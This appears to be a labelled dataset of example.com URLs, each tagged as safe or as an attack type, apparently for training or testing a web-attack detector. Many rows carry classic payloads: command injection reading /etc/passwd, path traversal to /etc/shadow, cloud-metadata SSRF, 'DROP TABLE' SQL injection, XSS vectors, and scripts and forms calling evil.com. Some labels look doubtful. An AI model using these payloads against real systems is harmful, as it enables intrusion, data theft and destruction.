+https://example.com/?file=user123,NONE,Safe input
+https://example.com/?redirect=name%3DJohnDoe,NONE,Safe input
+https://example.com/?input=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?q=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?cmd=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?url=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?cmd=logout%3Dtrue,NONE,Safe input
+https://example.com/?id=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?search=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?data=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?token=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?redirect=feedback,NONE,Safe input
+https://example.com/?path=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?data=banana,NONE,Safe input
+https://example.com/?path=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?id=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?search=apple,NONE,Safe input
+https://example.com/?token=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?token=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?content=lang%3Den,NONE,Safe input
+https://example.com/?id=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?url=banana,NONE,Safe input
+https://example.com/?url=banana,NONE,Safe input
+https://example.com/?q=user123,NONE,Safe input
+https://example.com/?url=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?input=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?redirect=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?data=query%3Dhelp,NONE,Safe input
+https://example.com/?redirect=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?q=feedback,NONE,Safe input
+https://example.com/?redirect=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?data=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?cmd=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?input=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?path=name%3DJohnDoe,NONE,Safe input
+https://example.com/?file=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?data=name%3DJohnDoe,NONE,Safe input
+https://example.com/?file=logout%3Dtrue,NONE,Safe input
+https://example.com/?content=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?content=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?id=id%3D567,NONE,Safe input
+https://example.com/?q=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?redirect=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?q=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?data=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?content=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?search=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?content=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?input=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?content=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?token=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?data=name%3DJohnDoe,NONE,Safe input
+https://example.com/?redirect=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?search=banana,NONE,Safe input
+https://example.com/?content=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?user=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?content=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?data=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?search=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?q=apple,NONE,Safe input
+https://example.com/?path=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?content=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?content=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?content=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?redirect=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?content=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?url=hello,NONE,Safe input
+https://example.com/?token=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?content=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?token=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?url=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?token=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?url=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?q=query%3Dhelp,NONE,Safe input
+https://example.com/?token=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?input=id%3D567,NONE,Safe input
+https://example.com/?input=apple,NONE,Safe input
+https://example.com/?q=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?file=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?data=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?path=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?redirect=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?url=id%3D567,NONE,Safe input
+https://example.com/?path=lang%3Den,NONE,Safe input
+https://example.com/?url=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?file=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?file=query%3Dhelp,NONE,Safe input
+https://example.com/?redirect=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?data=feedback,NONE,Safe input
+https://example.com/?file=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?url=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?user=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?url=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?id=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?url=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?data=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?data=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?token=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?search=id%3D567,NONE,Safe input
+https://example.com/?path=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?user=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?q=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?path=about-us,NONE,Safe input
+https://example.com/?q=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?data=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?cmd=page%3Dhome,NONE,Safe input
+https://example.com/?q=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?q=hello,NONE,Safe input
+https://example.com/?file=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?url=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?search=page%3Dhome,NONE,Safe input
+https://example.com/?data=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?id=about-us,NONE,Safe input
+https://example.com/?input=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?input=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?url=feedback,NONE,Safe input
+https://example.com/?file=name%3DJohnDoe,NONE,Safe input
+https://example.com/?user=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?redirect=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?user=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?redirect=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?input=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?q=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?url=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?search=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?content=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?redirect=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?input=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?file=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?search=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?input=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?content=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?cmd=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?input=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?id=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?cmd=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?path=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?file=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?path=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?data=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?content=lang%3Den,NONE,Safe input
+https://example.com/?cmd=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?user=lang%3Den,NONE,Safe input
+https://example.com/?cmd=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?search=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?cmd=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?q=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?cmd=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?token=user123,NONE,Safe input
+https://example.com/?data=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?search=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?file=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?user=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?search=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?q=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?search=filter%3Dpopular,NONE,Safe input
+https://example.com/?file=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?input=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?input=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?redirect=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?q=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?path=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?file=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?cmd=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?user=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?cmd=name%3DJohnDoe,NONE,Safe input
+https://example.com/?token=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?url=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?path=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?url=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?input=lang%3Den,NONE,Safe input
+https://example.com/?cmd=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?url=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?file=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?cmd=id%3D567,NONE,Safe input
+https://example.com/?content=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?search=search%3Dproducts,NONE,Safe input
+https://example.com/?content=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?content=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?url=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?user=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?input=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?redirect=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?redirect=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?url=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?id=filter%3Dpopular,NONE,Safe input
+https://example.com/?q=page%3Dhome,NONE,Safe input
+https://example.com/?path=banana,NONE,Safe input
+https://example.com/?id=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?redirect=logout%3Dtrue,NONE,Safe input
+https://example.com/?redirect=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?cmd=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?url=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?file=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?search=filter%3Dpopular,NONE,Safe input
+https://example.com/?data=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?id=page%3Dhome,NONE,Safe input
+https://example.com/?search=hello,NONE,Safe input
+https://example.com/?user=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?content=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?cmd=name%3DJohnDoe,NONE,Safe input
+https://example.com/?search=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?url=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?redirect=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?token=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?cmd=page%3Dhome,NONE,Safe input
+https://example.com/?input=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?redirect=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?file=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?q=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?path=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?redirect=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?content=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?q=search%3Dproducts,NONE,Safe input
+https://example.com/?user=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?redirect=apple,NONE,Safe input
+https://example.com/?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?id=lang%3Den,NONE,Safe input
+https://example.com/?url=about-us,NONE,Safe input
+https://example.com/?search=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?id=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?content=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?content=category%3Dbooks,NONE,Safe input
+https://example.com/?id=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?q=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?id=feedback,NONE,Safe input
+https://example.com/?redirect=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?user=about-us,NONE,Safe input
+https://example.com/?path=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?user=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?url=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?file=id%3D567,NONE,Safe input
+https://example.com/?content=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?cmd=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?cmd=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?user=search%3Dproducts,NONE,Safe input
+https://example.com/?id=name%3DJohnDoe,NONE,Safe input
+https://example.com/?input=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?q=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?content=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?path=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?q=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?content=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?q=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?input=logout%3Dtrue,NONE,Safe input
+https://example.com/?id=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?user=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?data=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?file=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?token=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?data=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?q=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?file=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?q=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?id=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?path=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?file=page%3Dhome,NONE,Safe input
+https://example.com/?cmd=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?file=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?cmd=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?url=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?file=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?url=filter%3Dpopular,NONE,Safe input
+https://example.com/?cmd=page%3Dhome,NONE,Safe input
+https://example.com/?id=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?path=apple,NONE,Safe input
+https://example.com/?id=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?search=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?id=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
